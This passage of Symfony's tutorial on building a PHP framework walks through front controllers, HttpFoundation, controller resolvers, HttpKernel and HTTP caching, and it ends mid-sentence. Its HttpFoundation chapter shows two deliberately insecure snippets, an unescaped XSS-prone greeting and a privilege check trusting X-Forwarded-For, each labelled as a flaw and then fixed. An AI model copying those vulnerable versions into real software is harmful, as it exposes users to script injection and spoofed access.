    require_once __DIR__.'/init.php';

    $name = $request->query->get('name', 'World');

    $response->setContent(sprintf('Hello %s', htmlspecialchars($name, ENT_QUOTES, 'UTF-8')));
    $response->send();

And for the "Goodbye" page::

    // framework/bye.php
    require_once __DIR__.'/init.php';

    $response->setContent('Goodbye!');
    $response->send();

We have indeed moved most of the shared code into a central place, but it does
not feel like a good abstraction, does it? We still have the ``send()`` method
for all pages, our pages do not look like templates and we are still not able
to test this code properly.

Moreover, adding a new page means that we need to create a new PHP script, the name of
which is exposed to the end user via the URL
(``http://127.0.0.1:4321/bye.php``). There is a direct mapping between the PHP
script name and the client URL. This is because the dispatching of the request
is done by the web server directly. It might be a good idea to move this
dispatching to our code for better flexibility. This can be achieved by routing
all client requests to a single PHP script.

.. tip::

    Exposing a single PHP script to the end user is a design pattern called
    the ":ref:`front controller <from_flat_php-front-controller>`".

Such a script might look like the following::

    // framework/front.php
    require_once __DIR__.'/vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();
    $response = new Response();

    $map = [
        '/hello' => __DIR__.'/hello.php',
        '/bye'   => __DIR__.'/bye.php',
    ];

    $path = $request->getPathInfo();
    if (isset($map[$path])) {
        require $map[$path];
    } else {
        $response->setStatusCode(404);
        $response->setContent('Not Found');
    }

    $response->send();

And here is for instance the new ``hello.php`` script::

    // framework/hello.php
    $name = $request->query->get('name', 'World');
    $response->setContent(sprintf('Hello %s', htmlspecialchars($name, ENT_QUOTES, 'UTF-8')));

In the ``front.php`` script, ``$map`` associates URL paths with their
corresponding PHP script paths.

As a bonus, if the client asks for a path that is not defined in the URL map,
we return a custom 404 page. You are now in control of your website.

To access a page, you must now use the ``front.php`` script:

* ``http://127.0.0.1:4321/front.php/hello?name=Fabien``

* ``http://127.0.0.1:4321/front.php/bye``

``/hello`` and ``/bye`` are the page *paths*.

.. tip::

    Most web servers like Apache or nginx are able to rewrite the incoming URLs
    and remove the front controller script so that your users will be able to
    type ``http://127.0.0.1:4321/hello?name=Fabien``, which looks much better.

The trick is the usage of the ``Request::getPathInfo()`` method which returns
the path of the Request by removing the front controller script name including
its sub-directories (only if needed -- see above tip).

.. tip::

    You don't even need to set up a web server to test the code. Instead,
    replace the ``$request = Request::createFromGlobals();`` call to something
    like ``$request = Request::create('/hello?name=Fabien');`` where the
    argument is the URL path you want to simulate.

Now that the web server always accesses the same script (``front.php``) for all
pages, we can secure the code further by moving all other PHP files outside of the
web root directory:

.. code-block:: text

    example.com
    ├── composer.json
    ├── composer.lock
    ├── src
    │   └── pages
    │       ├── hello.php
    │       └── bye.php
    ├── vendor
    │   └── autoload.php
    └── web
        └── front.php

Now, configure your web server root directory to point to ``web/`` and all
other files will no longer be accessible from the client.

To test your changes in a browser (``http://localhost:4321/hello?name=Fabien``),
run the :doc:`Symfony Local Web Server </setup/symfony_server>`:

.. code-block:: terminal

    $ symfony server:start --port=4321 --passthru=front.php

.. note::

    For this new structure to work, you will have to adjust some paths in
    various PHP files; the changes are left as an exercise for the reader.

The last thing that is repeated in each page is the call to ``setContent()``.
We can convert all pages to "templates" by echoing the content and calling
the ``setContent()`` directly from the front controller script::

    // example.com/web/front.php

    // ...

    $path = $request->getPathInfo();
    if (isset($map[$path])) {
        ob_start();
        include $map[$path];
        $response->setContent(ob_get_clean());
    } else {
        $response->setStatusCode(404);
        $response->setContent('Not Found');
    }

    // ...

And the ``hello.php`` script can now be converted to a template:

.. code-block:: html+php

    <!-- example.com/src/pages/hello.php -->
    <?php $name = $request->query->get('name', 'World') ?>

    Hello <?= htmlspecialchars($name, ENT_QUOTES, 'UTF-8') ?>

We have the first version of our framework::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();
    $response = new Response();

    $map = [
        '/hello' => __DIR__.'/../src/pages/hello.php',
        '/bye'   => __DIR__.'/../src/pages/bye.php',
    ];

    $path = $request->getPathInfo();
    if (isset($map[$path])) {
        ob_start();
        include $map[$path];
        $response->setContent(ob_get_clean());
    } else {
        $response->setStatusCode(404);
        $response->setContent('Not Found');
    }

    $response->send();

Adding a new page is a two-step process: add an entry in the map and create a
PHP template in ``src/pages/``. From a template, get the Request data via the
``$request`` variable and tweak the Response headers via the ``$response``
variable.

.. note::

    If you decide to stop here, you can probably enhance your framework by
    extracting the URL map to a configuration file.
The HttpFoundation Component
============================

Before diving into the framework creation process, let's first step back and
let's take a look at why you would like to use a framework instead of keeping
your plain-old PHP applications as is. Why using a framework is actually a good
idea, even for the simplest snippet of code and why creating your framework on
top of the Symfony components is better than creating a framework from scratch.

.. note::

    We won't talk about the traditional benefits of using a framework when
    working on big applications with more than a few developers; the Internet
    already has plenty of good resources on that topic.

Even if the "application" we wrote in the previous chapter was simple enough,
it suffers from a few problems::

    // framework/index.php
    $name = $_GET['name'];

    printf('Hello %s', $name);

First, if the ``name`` query parameter is not defined in the URL query string,
you will get a PHP warning; so let's fix it::

    // framework/index.php
    $name = $_GET['name'] ?? 'World';

    printf('Hello %s', $name);

Then, this *application is not secure*. Can you believe it? Even this simple
snippet of PHP code is vulnerable to one of the most widespread Internet
security issue, XSS (Cross-Site Scripting). Here is a more secure version::

    $name = $_GET['name'] ?? 'World';

    header('Content-Type: text/html; charset=utf-8');

    printf('Hello %s', htmlspecialchars($name, ENT_QUOTES, 'UTF-8'));

.. note::

    As you might have noticed, securing your code with ``htmlspecialchars`` is
    tedious and error prone. That's one of the reasons why using a template
    engine like `Twig`_, where auto-escaping is enabled by default, might be a
    good idea (and explicit escaping is also less painful with the usage of a
    simple ``e`` filter).

As you can see for yourself, the simple code we had written first is not that
simple anymore if we want to avoid PHP warnings/notices and make the code
more secure.

Beyond security, this code can be complex to test. Even if there is not
much to test, it strikes me that writing unit tests for the simplest possible
snippet of PHP code is not natural and feels ugly. Here is a tentative PHPUnit
unit test for the above code::

    // framework/test.php
    use PHPUnit\Framework\TestCase;

    class IndexTest extends TestCase
    {
        public function testHello(): void
        {
            $_GET['name'] = 'Fabien';

            ob_start();
            include 'index.php';
            $content = ob_get_clean();

            $this->assertEquals('Hello Fabien', $content);
        }
    }

.. note::

    If our application were just slightly bigger, we would have been able to
    find even more problems. If you are curious about them, read the
    :doc:`/introduction/from_flat_php_to_symfony` chapter of the book.

At this point, if you are not convinced that security and testing are indeed
two very good reasons to stop writing code the old way and adopt a framework
instead (whatever adopting a framework means in this context), you can stop
reading this book now and go back to whatever code you were working on before.

.. note::

    Using a framework should give you more than just security and testability,
    but the more important thing to keep in mind is that the framework you
    choose must allow you to write better code faster.

Going OOP with the HttpFoundation Component
-------------------------------------------

Writing web code is about interacting with HTTP. So, the fundamental
principles of our framework should be around the `HTTP specification`_.

The HTTP specification describes how a client (a browser for instance)
interacts with a server (our application via a web server). The dialog between
the client and the server is specified by well-defined *messages*, requests
and responses: *the client sends a request to the server and based on this
request, the server returns a response*.

In PHP, the request is represented by global variables (``$_GET``, ``$_POST``,
``$_FILE``, ``$_COOKIE``, ``$_SESSION``...) and the response is generated by
functions (``echo``, ``header``, ``setcookie``, ...).

The first step towards better code is probably to use an Object-Oriented
approach; that's the main goal of the Symfony HttpFoundation component:
replacing the default PHP global variables and functions by an Object-Oriented
layer.

To use this component, add it as a dependency of the project:

.. code-block:: terminal

    $ composer require symfony/http-foundation

Running this command will also automatically download the Symfony
HttpFoundation component and install it under the ``vendor/`` directory.
A ``composer.json`` and a ``composer.lock`` file will be generated as well,
containing the new requirement.

.. sidebar:: Class Autoloading

    When installing a new dependency, Composer also generates a
    ``vendor/autoload.php`` file that allows any class to be `autoloaded`_.
    Without autoloading, you would need to require the file where a class
    is defined before being able to use it. But thanks to `PSR-4`_,
    we can just let Composer and PHP do the hard work for us.

Now, let's rewrite our application by using the ``Request`` and the
``Response`` classes::

    // framework/index.php
    require_once __DIR__.'/vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();

    $name = $request->query->get('name', 'World');

    $response = new Response(sprintf('Hello %s', htmlspecialchars($name, ENT_QUOTES, 'UTF-8')));

    $response->send();

The ``createFromGlobals()`` method creates a ``Request`` object based on the
current PHP global variables.

The ``send()`` method sends the ``Response`` object back to the client (it
first outputs the HTTP headers followed by the content).

.. tip::

    Before the ``send()`` call, we should have added a call to the
    ``prepare()`` method (``$response->prepare($request);``) to ensure that
    our Response were compliant with the HTTP specification. For instance, if
    we were to call the page with the ``HEAD`` method, it would remove the
    content of the Response.

The main difference with the previous code is that you have total control of
the HTTP messages. You can create whatever request you want and you are in
charge of sending the response whenever you see fit.

.. note::

    We haven't explicitly set the ``Content-Type`` header in the rewritten
    code as the charset of the Response object defaults to ``UTF-8``.

With the ``Request`` class, you have all the request information at your
fingertips thanks to a nice and simple API::

    // the URI being requested (e.g. /about) minus any query parameters
    $request->getPathInfo();

    // retrieves GET and POST variables respectively
    $request->query->get('foo');
    $request->getPayload()->get('bar', 'default value if bar does not exist');

    // retrieves SERVER variables
    $request->server->get('HTTP_HOST');

    // retrieves an instance of UploadedFile identified by foo
    $request->files->get('foo');

    // retrieves a COOKIE value
    $request->cookies->get('PHPSESSID');

    // retrieves a HTTP request header, with normalized, lowercase keys
    $request->headers->get('host');
    $request->headers->get('content-type');

    $request->getMethod();    // GET, POST, PUT, DELETE, HEAD
    $request->getLanguages(); // an array of languages the client accepts

You can also simulate a request::

    $request = Request::create('/index.php?name=Fabien');

With the ``Response`` class, you can tweak the response::

    $response = new Response();

    $response->setContent('Hello world!');
    $response->setStatusCode(200);
    $response->headers->set('Content-Type', 'text/html');

    // configure the HTTP cache headers
    $response->setMaxAge(10);

.. tip::

    To debug a response, cast it to a string; it will return the HTTP
    representation of the response (headers and content).

Last but not least, these classes, like every other class in the Symfony
code, have been `audited`_ for security issues by an independent company. And
being an Open-Source project also means that many other developers around the
world have read the code and have already fixed potential security problems.
When was the last time you ordered a professional security audit for your home-made
framework?

Even something as simple as getting the client IP address can be insecure::

    if ($myIp === $_SERVER['REMOTE_ADDR']) {
        // the client is a known one, so give it some more privilege
    }

It works perfectly fine until you add a reverse proxy in front of the
production servers; at this point, you will have to change your code to make
it work on both your development machine (where you don't have a proxy) and
your servers::

    if ($myIp === $_SERVER['HTTP_X_FORWARDED_FOR'] || $myIp === $_SERVER['REMOTE_ADDR']) {
        // the client is a known one, so give it some more privilege
    }

Using the ``Request::getClientIp()`` method would have given you the right
behavior from day one (and it would have covered the case where you have
chained proxies)::

    $request = Request::createFromGlobals();

    if ($myIp === $request->getClientIp()) {
        // the client is a known one, so give it some more privilege
    }

And there is an added benefit: it is *secure* by default. What does it mean?
The ``$_SERVER['HTTP_X_FORWARDED_FOR']`` value cannot be trusted as it can be
manipulated by the end user when there is no proxy. So, if you are using this
code in production without a proxy, it becomes trivially easy to abuse your
system. That's not the case with the ``getClientIp()`` method as you must
explicitly trust your reverse proxies by calling ``setTrustedProxies()``::

    Request::setTrustedProxies(['10.0.0.1']);

    if ($myIp === $request->getClientIp()) {
        // the client is a known one, so give it some more privilege
    }

So, the ``getClientIp()`` method works securely in all circumstances. You can
use it in all your projects, whatever the configuration is, it will behave
correctly and safely. That's one of the goals of using a framework. If you were
to write a framework from scratch, you would have to think about all these
cases by yourself. Why not use a technology that already works?

.. note::

    If you want to learn more about the HttpFoundation component, you can have
    a look at the ``Symfony\Component\HttpFoundation`` API or read
    its dedicated :doc:`documentation </components/http_foundation>`.

Believe it or not but we have our first framework. You can stop now if you want.
Using just the Symfony HttpFoundation component already allows you to write
better and more testable code. It also allows you to write code faster as many
day-to-day problems have already been solved for you.

As a matter of fact, projects like Drupal have adopted the HttpFoundation
component; if it works for them, it will probably work for you. Don't reinvent
the wheel.

I've almost forgotten to talk about one added benefit: using the HttpFoundation
component is the start of better interoperability between all frameworks and
`applications using it`_ (like `Symfony`_, `Drupal 8`_, `phpBB 3`_, `Laravel`_
and `ezPublish 5`_,  and `more`_).

.. _`Twig`: https://twig.symfony.com/
.. _`HTTP specification`: https://tools.ietf.org/wg/httpbis/
.. _`audited`: https://symfony.com/blog/symfony2-security-audit
.. _`applications using it`: https://symfony.com/components/HttpFoundation
.. _`Symfony`: https://symfony.com/
.. _`Drupal 8`: https://www.drupal.org/
.. _`phpBB 3`: https://www.phpbb.com/
.. _`ezPublish 5`: https://ez.no/
.. _`Laravel`: https://laravel.com/
.. _`autoloaded`: https://www.php.net/autoload
.. _`PSR-4`: https://www.php-fig.org/psr/psr-4/
.. _`more`: https://symfony.com/components/HttpFoundation
The HttpKernel Component: the Controller Resolver
=================================================

You might think that our framework is already pretty solid and you are
probably right. But let's see how we can improve it nonetheless.

Right now, all our examples use procedural code, but remember that controllers
can be any valid PHP callbacks. Let's convert our controller to a proper
class::

    class LeapYearController
    {
        public function index($request): Response
        {
            if (is_leap_year($request->attributes->get('year'))) {
                return new Response('Yep, this is a leap year!');
            }

            return new Response('Nope, this is not a leap year.');
        }
    }

Update the route definition accordingly::

    $routes->add('leap_year', new Routing\Route('/is_leap_year/{year}', [
        'year' => null,
        '_controller' => [new LeapYearController(), 'index'],
    ]));

The move is pretty straightforward and makes a lot of sense as soon as you
create more pages but you might have noticed a non-desirable side effect...
The ``LeapYearController`` class is *always* instantiated, even if the
requested URL does not match the ``leap_year`` route. This is bad for one main
reason: performance-wise, all controllers for all routes must now be
instantiated for every request. It would be better if controllers were
lazy-loaded so that only the controller associated with the matched route is
instantiated.

To solve this issue, and a bunch more, let's install and use the HttpKernel
component:

.. code-block:: terminal

    $ composer require symfony/http-kernel

The HttpKernel component has many interesting features, but the ones we need
right now are the *controller resolver* and *argument resolver*. A controller resolver knows how to
determine the controller to execute and the argument resolver determines the arguments to pass to it,
based on a Request object. All controller resolvers implement the following interface::

    namespace Symfony\Component\HttpKernel\Controller;

    // ...
    interface ControllerResolverInterface
    {
        public function getController(Request $request);
    }

The ``getController()`` method relies on the same convention as the one we
have defined earlier: the ``_controller`` request attribute must contain the
controller associated with the Request. Besides the built-in PHP callbacks,
``getController()`` also supports strings composed of a class name followed by
two colons and a method name as a valid callback, like 'class::method'::

    $routes->add('leap_year', new Routing\Route('/is_leap_year/{year}', [
        'year' => null,
        '_controller' => 'LeapYearController::index',
    ]));

To make this code work, modify the framework code to use the controller
resolver from HttpKernel::

    use Symfony\Component\HttpKernel;

    $controllerResolver = new HttpKernel\Controller\ControllerResolver();
    $argumentResolver = new HttpKernel\Controller\ArgumentResolver();

    $controller = $controllerResolver->getController($request);
    $arguments = $argumentResolver->getArguments($request, $controller);

    $response = call_user_func_array($controller, $arguments);

.. note::

    As an added bonus, the controller resolver properly handles the error
    management for you: when you forget to define a ``_controller`` attribute
    for a Route for instance.

Now, let's see how the controller arguments are guessed. ``getArguments()``
introspects the controller signature to determine which arguments to pass to
it by using the native PHP `reflection`_. This method is defined in the
following interface::

    namespace Symfony\Component\HttpKernel\Controller;

    // ...
    interface ArgumentResolverInterface
    {
        public function getArguments(Request $request, $controller);
    }

The ``index()`` method needs the Request object as an argument.
``getArguments()`` knows when to inject it properly if it is type-hinted
correctly::

    public function index(Request $request)

    // won't work
    public function index($request)

More interesting, ``getArguments()`` is also able to inject any Request
attribute; if the argument has the same name as the corresponding
attribute::

    public function index(int $year)

You can also inject the Request and some attributes at the same time (as the
matching is done on the argument name or a type hint, the arguments order does
not matter)::

    public function index(Request $request, int $year)

    public function index(int $year, Request $request)

Finally, you can also define default values for any argument that matches an
optional attribute of the Request::

    public function index(int $year = 2012)

Let's inject the ``$year`` request attribute for our controller::

    class LeapYearController
    {
        public function index(int $year): Response
        {
            if (is_leap_year($year)) {
                return new Response('Yep, this is a leap year!');
            }

            return new Response('Nope, this is not a leap year.');
        }
    }

The resolvers also take care of validating the controller callable and its
arguments. In case of a problem, it throws an exception with a nice message
explaining the problem (the controller class does not exist, the method is not
defined, an argument has no matching attribute, ...).

.. note::

    With the great flexibility of the default controller resolver and argument
    resolver, you might wonder why someone would want to create another one
    (why would there be an interface if not?). Two examples: in Symfony,
    ``getController()`` is enhanced to support :doc:`controllers as services </controller/service>`;
    and ``getArguments()`` provides an extension point to alter or enhance
    the resolving of arguments.

Let's conclude with the new version of our framework::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel;
    use Symfony\Component\Routing;

    function render_template(Request $request): Response
    {
        extract($request->attributes->all(), EXTR_SKIP);
        ob_start();
        include sprintf(__DIR__.'/../src/pages/%s.php', $_route);

        return new Response(ob_get_clean());
    }

    $request = Request::createFromGlobals();
    $routes = include __DIR__.'/../src/app.php';

    $context = new Routing\RequestContext();
    $context->fromRequest($request);
    $matcher = new Routing\Matcher\UrlMatcher($routes, $context);

    $controllerResolver = new HttpKernel\Controller\ControllerResolver();
    $argumentResolver = new HttpKernel\Controller\ArgumentResolver();

    try {
        $request->attributes->add($matcher->match($request->getPathInfo()));

        $controller = $controllerResolver->getController($request);
        $arguments = $argumentResolver->getArguments($request, $controller);

        $response = call_user_func_array($controller, $arguments);
    } catch (Routing\Exception\ResourceNotFoundException $exception) {
        $response = new Response('Not Found', 404);
    } catch (Exception $exception) {
        $response = new Response('An error occurred', 500);
    }

    $response->send();

Think about it once more: our framework is more robust and more flexible than
ever and it still has less than 50 lines of code.

.. _`reflection`: https://www.php.net/reflection
The HttpKernel Component: The HttpKernel Class
==============================================

If you were to use our framework right now, you would probably have to add
support for custom error messages. We do have 404 and 500 error support but
the responses are hardcoded in the framework itself. Making them customizable
is straightforward though: dispatch a new event and listen to it. Doing it right
means that the listener has to call a regular controller. But what if the
error controller throws an exception? You will end up in an infinite loop.
There should be an easier way, right?

Enter the ``HttpKernel`` class. Instead of solving the same problem over and
over again and instead of reinventing the wheel each time, the ``HttpKernel``
class is a generic, extensible and flexible implementation of
``HttpKernelInterface``.

This class is very similar to the framework class we have written so far: it
dispatches events at some strategic points during the handling of the request,
it uses a controller resolver to choose the controller to dispatch the request
to, and as an added bonus, it takes care of edge cases and provides great
feedback when a problem arises.

Here is the new framework code::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    use Symfony\Component\HttpKernel\HttpKernel;

    class Framework extends HttpKernel
    {
    }

And the new front controller::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\EventDispatcher\EventDispatcher;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel;
    use Symfony\Component\Routing;

    $request = Request::createFromGlobals();
    $requestStack = new RequestStack();
    $routes = include __DIR__.'/../src/app.php';

    $context = new Routing\RequestContext();
    $matcher = new Routing\Matcher\UrlMatcher($routes, $context);

    $controllerResolver = new HttpKernel\Controller\ControllerResolver();
    $argumentResolver = new HttpKernel\Controller\ArgumentResolver();

    $dispatcher = new EventDispatcher();
    $dispatcher->addSubscriber(new HttpKernel\EventListener\RouterListener($matcher, $requestStack));

    $framework = new Simplex\Framework($dispatcher, $controllerResolver, $requestStack, $argumentResolver);

    $response = $framework->handle($request);
    $response->send();

``RouterListener`` is an implementation of the same logic we had in our
framework: it matches the incoming request and populates the request
attributes with route parameters.

Our code is now much more concise and surprisingly more robust and more
powerful than ever. For instance, use the built-in ``ErrorListener`` to
make your error management configurable::

    $errorHandler = function (Symfony\Component\ErrorHandler\Exception\FlattenException $exception): Response {
        $msg = 'Something went wrong! ('.$exception->getMessage().')';

        return new Response($msg, $exception->getStatusCode());
    };
    $dispatcher->addSubscriber(new HttpKernel\EventListener\ErrorListener($errorHandler));

``ErrorListener`` gives you a ``FlattenException`` instance instead of the
thrown ``Exception`` or ``Error`` instance to ease exception manipulation and
display. It can take any valid controller as an exception handler, so you can
create an ErrorController class instead of using a Closure::

    $listener = new HttpKernel\EventListener\ErrorListener(
        'Calendar\Controller\ErrorController::exception'
    );
    $dispatcher->addSubscriber($listener);

The error controller reads as follows::

    // example.com/src/Calendar/Controller/ErrorController.php
    namespace Calendar\Controller;

    use Symfony\Component\ErrorHandler\Exception\FlattenException;
    use Symfony\Component\HttpFoundation\Response;

    class ErrorController
    {
        public function exception(FlattenException $exception): Response
        {
            $msg = 'Something went wrong! ('.$exception->getMessage().')';

            return new Response($msg, $exception->getStatusCode());
        }
    }

*Voilà!* Clean and customizable error management without efforts. And if your
``ErrorController`` throws an exception, HttpKernel will handle it nicely.

In chapter two, we talked about the ``Response::prepare()`` method, which
ensures that a Response is compliant with the HTTP specification. It is
probably a good idea to always call it just before sending the Response to the
client; that's what the ``ResponseListener`` does::

    $dispatcher->addSubscriber(new HttpKernel\EventListener\ResponseListener('UTF-8'));

And in your controller, return a ``StreamedResponse`` instance instead of a
``Response`` instance.

.. tip::

    Read the :doc:`/reference/events` reference to learn more about the events
    dispatched by HttpKernel and how they allow you to change the flow of a
    request.

Now, let's create a listener, one that allows a controller to return a string
instead of a full Response object::

    class LeapYearController
    {
        public function index(int $year): string
        {
            $leapYear = new LeapYear();
            if ($leapYear->isLeapYear($year)) {
                return 'Yep, this is a leap year! ';
            }

            return 'Nope, this is not a leap year.';
        }
    }

To implement this feature, we are going to listen to the ``kernel.view``
event, which is triggered just after the controller has been called. Its goal
is to convert the controller return value to a proper Response instance, but
only if needed::

    // example.com/src/Simplex/StringResponseListener.php
    namespace Simplex;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Event\ViewEvent;

    class StringResponseListener implements EventSubscriberInterface
    {
        public function onView(ViewEvent $event): void
        {
            $response = $event->getControllerResult();

            if (is_string($response)) {
                $event->setResponse(new Response($response));
            }
        }

        public static function getSubscribedEvents(): array
        {
            return ['kernel.view' => 'onView'];
        }
    }

The code is simple because the ``kernel.view`` event is only triggered when
the controller return value is not a Response and because setting the response
on the event stops the event propagation (our listener cannot interfere with
other view listeners).

Don't forget to register it in the front controller::

    $dispatcher->addSubscriber(new Simplex\StringResponseListener());

.. note::

    If you forget to register the subscriber, HttpKernel will throw an
    exception with a nice message: ``The controller must return a response
    (Nope, this is not a leap year. given).``.

At this point, our whole framework code is as compact as possible and it is
mainly composed of an assembly of existing libraries. Extending is a matter
of registering event listeners/subscribers.

Hopefully, you now have a better understanding of why the simple looking
``HttpKernelInterface`` is so powerful. Its default implementation,
``HttpKernel``, gives you access to a lot of cool features, ready to be used
out of the box, with no efforts. And because HttpKernel is actually the code
that powers the Symfony framework, you have the best of both
worlds: a custom framework, tailored to your needs, but based on a rock-solid
and well maintained low-level architecture that has been proven to work for
many websites; a code that has been audited for security issues and that has
proven to scale well.
The HttpKernel Component: HttpKernelInterface
=============================================

In the conclusion of the second chapter of this book, I've talked about one
great benefit of using the Symfony components: the *interoperability* between
all frameworks and applications using them. Let's do a big step towards this
goal by making our framework implement ``HttpKernelInterface``::

    namespace Symfony\Component\HttpKernel;

    // ...
    interface HttpKernelInterface
    {
        /**
         * @return Response A Response instance
         */
        public function handle(
            Request $request,
            int $type = self::MAIN_REQUEST,
            bool $catch = true
        ): Response;
    }

``HttpKernelInterface`` is probably the most important piece of code in the
HttpKernel component, no kidding. Frameworks and applications that implement
this interface are fully interoperable. Moreover, a lot of great features will
come with it for free.

Update your framework so that it implements this interface::

    // example.com/src/Framework.php

    // ...
    use Symfony\Component\HttpKernel\HttpKernelInterface;

    class Framework implements HttpKernelInterface
    {
        // ...

        public function handle(
            Request $request,
            int $type = HttpKernelInterface::MAIN_REQUEST,
            bool $catch = true
        ) {
            // ...
        }
    }

With this change, a little goes a long way! Let's talk about one of
the most impressive upsides: transparent :doc:`HTTP caching </http_cache>` support.

The ``HttpCache`` class implements a fully-featured reverse proxy, written in
PHP; it implements ``HttpKernelInterface`` and wraps another
``HttpKernelInterface`` instance::

    // example.com/web/front.php

    // ...
    use Symfony\Component\HttpKernel;

    $framework = new Simplex\Framework($dispatcher, $matcher, $controllerResolver, $argumentResolver);
    $framework = new HttpKernel\HttpCache\HttpCache(
        $framework,
        new HttpKernel\HttpCache\Store(__DIR__.'/../cache')
    );

    $response = $framework->handle($request);
    $response->send();

That's all it takes to add HTTP caching support to our framework. Isn't it
amazing?

Configuring the cache needs to be done via HTTP cache headers. For instance,
to cache a response for 10 seconds, use the ``Response::setTtl()`` method::

    // example.com/src/Calendar/Controller/LeapYearController.php

    // ...
    public function index(Request $request, int $year): Response
    {
        $leapYear = new LeapYear();
        if ($leapYear->isLeapYear($year)) {
            $response = new Response('Yep, this is a leap year!');
        } else {
            $response = new Response('Nope, this is not a leap year.');
        }

        $response->setTtl(10);

        return $response;
    }

.. tip::

    If you are running your framework from the command line by simulating
    requests (``Request::create('/is_leap_year/2012')``), you can debug Response
    instances by dumping their string representation (``echo $response;``) as it
    displays all headers as well as the response content.

To validate that it works correctly, add a random number to the response
content and check that the number only changes every 10 seconds::

    $response = new Response('Yep, this is a leap year! '.rand());

.. note::

    When deploying to your production environment, keep using the Symfony
    reverse proxy (great for shared hosting) or even better, switch to a more
    efficient reverse proxy like `Varnish`_.

Using HTTP cache headers to manage your application cache is very powerful and
allows you to tune finely your caching strategy as you can use both the
expiration and the validation models of the HTTP specification. If you are not
comfortable with these concepts, read the :doc:`HTTP caching </http_cache>` chapter of the
Symfony documentation.

The Response class contains methods that let you configure the HTTP cache. One
of the most powerful is ``setCache()`` as it abstracts the most frequently used
caching strategies into a single array::

    $response->setCache([
        'must_revalidate'  => false,
        'no_cache'         => false,
        'no_store'         => false,
        'no_transform'     => false,
        'public'           => true,
        'private'          => false,
        'proxy_revalidate' => false,
        'max_age'          => 600,
        's_maxage'         => 600,
        'immutable'        => true,
        'last_modified'    => new \DateTime(),
        'etag'             => 'abcdef'
    ]);

    // it is equivalent to the following code
    $response->setPublic();
    $response->setMaxAge(600);
    $response->setSharedMaxAge(600);
    $response->setImmutable();
    $response->setLastModified(new \DateTime());
    $response->setEtag('abcde');

When using the validation model, the ``isNotModified()`` method allows you to
cut on the response time by short-circuiting the response generation as early as
possible::

    $response->setETag('whatever_you_compute_as_an_etag');

    if ($response->isNotModified($request)) {
        return $response;
    }

    $response->setContent('The computed content of the response');

    return $response;

Using HTTP caching is great, but what if you cannot cache the whole page? What
if you can cache everything but some sidebar that is more dynamic that the
rest of the content? Edge Side Includes (`ESI`_) to the rescue! Instead of
generating the whole content in one go, ESI allows you to mark a region of a
page as being the content of a sub-request call:

.. code-block:: html

    This is the content of your page

    Is 2012 a leap year? <esi:include src="/leapyear/2012"/>

    Some other content

For ESI tags to be supported by HttpCache, you need to pass it an instance of
the ``ESI`` class. The ``ESI`` class automatically parses ESI tags and makes
sub-requests to convert them to their proper content::

    $framework = new HttpKernel\HttpCache\HttpCache(
        $framework,
        new HttpKernel\HttpCache\Store(__DIR__.'/../cache'),
        new HttpKernel\HttpCache\Esi()
    );

.. note::

    For ESI to work, you need to use a reverse proxy that supports it like the
    Symfony implementation. `Varnish`_ is the best alternative and it is
    Open-Source.

When using complex HTTP caching strategies and/or many ESI include tags, it
can be hard to understand why and when a resource should be cached or not. To
ease debugging, you can enable the debug mode::

    $framework = new HttpKernel\HttpCache\HttpCache(
        $framework,
        new HttpKernel\HttpCache\Store(__DIR__.'/../cache'),
        new HttpKernel\HttpCache\Esi(),
        ['debug' => true]
    );

The debug mode adds a ``X-Symfony-Cache`` header to each response that
describes what the cache layer did:

.. code-block:: text

    X-Symfony-Cache:  GET /is_leap_year/2012: stale, invalid, store

    X-Symfony-Cache:  GET /is_leap_year/2012: fresh

HttpCache has many features like support for the
``stale-while-revalidate`` and ``stale-if-error`` HTTP Cache-Control
extensions as defined in RFC 5861.

With the addition of a single interface, our framework can now benefit from
the many features built into the HttpKernel component; HTTP caching being just
one of them but an important one as it can make your applications fly!

.. _`ESI`: https://en.wikipedia.org/wiki/Edge_Side_Includes
.. _`Varnish`: https://varnish-cache.org/
Create your own PHP Framework
=============================

.. toctree::

    introduction
    http_foundation
    front_controller
    routing
    templating
    http_kernel_controller_resolver
    separation_of_concerns
    unit_testing
    event_dispatcher
    http_kernel_httpkernelinterface
    http_kernel_httpkernel_class
    dependency_injection
Introduction
============

`Symfony`_ is a reusable set of standalone, decoupled and cohesive PHP
components that solve common web development problems.

Instead of using these low-level components, you can use the ready-to-be-used
Symfony full-stack web framework, which is based on these components... or
you can create your very own framework. This tutorial is about the latter.

Why would you Like to Create your Own Framework?
------------------------------------------------

Why would you like to create your own framework in the first place? If you
look around, everybody will tell you that it's a bad thing to reinvent the
wheel and that you'd better choose an existing framework and forget about
creating your own altogether. Most of the time, they are right but there are
a few good reasons to start creating your own framework:

* To learn more about the low level architecture of modern web frameworks in
  general and about the Symfony full-stack framework internals in particular;

* To create a framework tailored to your very specific needs (just be sure
  first that your needs are really specific);

* To experiment creating a framework for fun (in a learn-and-throw-away
  approach);

* To refactor an old/existing application that needs a good dose of recent web
  development best practices;

* To prove the world that you can actually create a framework on your own (...
  but with little effort).

This tutorial will gently guide you through the creation of a web framework,
one step at a time. At each step, you will have a fully-working framework that
you can use as is or as a start for your very own. It will start with a simple
framework and more features will be added with time. Eventually, you will have
a fully-featured full-stack web framework.

And each step will be the occasion to learn more about some of the Symfony
Components.

Many modern web frameworks advertise themselves as being MVC frameworks. This
tutorial won't talk about the MVC pattern, as the Symfony Components are able to
create any type of frameworks, not just the ones that follow the MVC
architecture. Anyway, if you have a look at the MVC semantics, this book is
about how to create the Controller part of a framework. For the Model and the
View, it really depends on your personal taste and you can use any existing
